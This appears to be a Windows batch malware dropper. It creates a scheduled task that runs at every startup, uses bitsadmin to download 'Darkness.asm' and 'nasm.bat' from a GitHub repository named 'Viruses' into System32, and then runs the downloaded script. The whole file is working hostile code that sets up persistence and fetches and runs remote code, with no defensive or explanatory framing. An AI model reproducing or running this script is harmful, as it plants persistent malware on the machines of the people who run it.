@echo off

cd /d %windir%\system32
schtasks /create /tn "Startup Task" /tr "%windir%\System32\main.bat" /sc onstart
bitsadmin /transfer "downloadDarkness" /download /priority normal https://gist.github.com/INeddHelp/1308b6e410f2efce0cf716d9ab58abcd %SystemRoot%\System32\Darkness.asm
bitsadmin /transfer "downloadNasm" /download /priority normal https://github.com/INeddHelp/Viruses/tree/master/Darkness/nasm.bat %SystemRoot%\System32\nasm.bat

start nasm.bat